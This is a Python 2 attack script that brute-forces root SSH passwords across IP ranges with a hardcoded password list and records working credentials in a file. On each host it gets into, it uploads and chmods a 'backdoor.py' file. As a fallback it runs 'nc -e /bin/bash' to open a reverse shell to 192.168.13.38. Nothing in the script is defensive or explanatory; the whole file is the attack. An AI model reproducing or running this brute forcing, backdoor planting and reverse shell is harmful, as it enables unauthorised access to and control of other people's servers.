#!/usr/bin/python

import paramiko
import netaddr
import  sys
import threading
import Queue


net=[]
passwd=['yabx1234','yabx@2016','Yabx@2016','root','passwd','123456','passwd123','123passwd','root123','Passwd123','passwd1234','PASSWD',]
ssh_scan=[]

queue=Queue.Queue(maxsize=1)
file_1=open('target.txt','a')
queue.put(file_1)

for i in range(len(sys.argv)):
    if i ==0:
        continue
    else:
        net.append(netaddr.IPNetwork(str(sys.argv[i])))


def ssh_con_cmd(net_list,queue):
    global passwd
#    global mutex
    ssh=None
    for x in net_list:
        try:
            ssh=paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            for p in passwd:
                try:
                    print 'ssh connect.....%s' %str(x) 
                    ssh.connect(str(x),22,'root',p,timeout=5)
                except:
                    continue
                else:

                    f_1=queue.get()
                    file_1.write('server:'+str(x)+' user:'+'root '+' passwd:'+str(p))
                    print str(x)+'is ok!'
                    file_1.write(' T\n')
                    queue.put(f_1)
                    try:

                        t=paramiko.Transport(str(x),22)
                        t.connect(username='root',password=p)
                        sftp=paramiko.SFTPClient.from_transport(t)
                        sftp.put(localpath='/root/Development/Python/test/backdoor.py',remotepath='/root/backdoor.py')
                        print 'shang chuan!'
                        ssh.exec_command('chmod 777 /root/backdoor.py')
                        #ssh.exec_command('/root/backdoor.py')
                        t.close()
                        ssh.close()
                    except:
                        ssh.connect(str(x),22,'root',p,timeout=5)
                        ssh.exec_command('nc -e /bin/bash 192.168.13.38 1234')
                        ssh.close()

        except:
            continue
#    SystemError
def main():
    global queue
    th=[]
    for j in net:
        th.append(threading.Thread(target=ssh_con_cmd,args=(j,queue)).start())


if __name__ == '__main__':
    main()






